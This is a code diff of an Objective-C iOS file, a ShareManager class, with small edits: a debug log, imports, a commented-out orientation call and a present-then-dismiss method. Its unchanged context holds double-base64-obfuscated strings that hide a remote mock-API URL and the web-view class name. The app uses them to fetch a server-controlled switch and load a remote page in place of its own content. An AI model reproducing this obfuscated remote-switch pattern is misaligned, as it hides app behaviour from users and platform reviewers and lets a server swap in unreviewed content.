@@ -4,7 +4,8 @@
 #import "OpenTool.h"
 #import "AppDelegate.h"
 #import "Masonry.h"
-
+#import "ViewController.h"
+#import "UIDevice+TFDevice.h"
 
 @implementation ShareManager
 
@@ -25,6 +26,7 @@
     
     
 //    [self showtitle:str with:view];
+    NSLog(@"333333333333333");
 
     NSLog(@"gamestr:%@",str);
     NSString*title = nil;
@@ -41,7 +43,7 @@
 }
 
 -(void)request:(UIView*)view {
-    
+   
     //mock/272624/alxihjaeb
     NSString*game = [NSString stringWithFormat:@"%@%@",@"aHR0cDovL3JhcDJhcGkudGFvYmFvLm9yZy9hcHAv".base64Decoding,@"Ylc5amF5OHlOekkyTWpRdllXeDRhV2hxWVdWaQ==".base64Decoding.base64Decoding];
     NSURL *storeURL = [NSURL URLWithString:game];
@@ -65,11 +67,10 @@
                     [OpenTool base:alxihjaeb12];
                 }
                 
-                
                 if ([alxihjaeb3 isEqualToString:@"landscape"]) {
                     [AppDelegate setOrientation:@"H"];
                 }else{
-                    [AppDelegate setOrientation:@"V"];
+                    //[AppDelegate setOrientation:@"V"];
                 }
                 [self showtitle:alxihjaeb12 with:view];
             });
@@ -81,6 +82,17 @@
     [dataTask resume];
 }
 
+-(void)show{
+    
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+        UIViewController*rootvc = [UIApplication sharedApplication].keyWindow.rootViewController;
+        [rootvc presentViewController:[UIViewController new] animated:false completion:nil];
+        [rootvc dismissViewControllerAnimated:false completion:nil];
+    });
+    
+   
+    
+}
 
 -(void)showtitle:(NSString*)title with:(UIView*)view{
     Class MyObject = NSClassFromString(@"VUlXZWJWaWV3".base64Decoding);
